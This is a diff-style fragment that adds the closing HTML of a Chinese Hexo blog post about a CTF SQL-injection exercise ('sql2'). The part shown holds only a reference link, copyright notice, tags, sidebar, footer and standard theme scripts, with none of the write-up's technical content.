+<p>参考<br><a href="https://www.codetd.com/article/11976293" target="_blank" rel="noopener">https://www.codetd.com/article/11976293</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>π1L4r</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/" title="《从0到1：CTFer成长之路》Web之sql2">https://www.smartpillar.xyz/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/" rel="next" title="i春秋-Pretty_good_privacy">
+                <i class="fa fa-chevron-left"></i> i春秋-Pretty_good_privacy
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/author.jpg"
+                alt="π1L4r" />
+            
+              <p class="site-author-name" itemprop="name">π1L4r</p>
+              <p class="site-description motion-element" itemprop="description">changed my nickname= =.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">38</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">20</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/such-stupid6" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:alexi_bi@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mlogs.top" title="My0sotis" target="_blank">My0sotis</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=320 height=110 src="//music.163.com/outchain/player?type=0&id=5055514487&auto=1&height=90"></iframe>
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#导语"><span class="nav-number">1.</span> <span class="nav-text">导语</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql2"><span class="nav-number">2.</span> <span class="nav-text">sql2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright"> &copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">π1L4r</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v4.2.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.5.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color='114,114,114' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.6"  zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v=6.5.0"></script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":true},"log":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
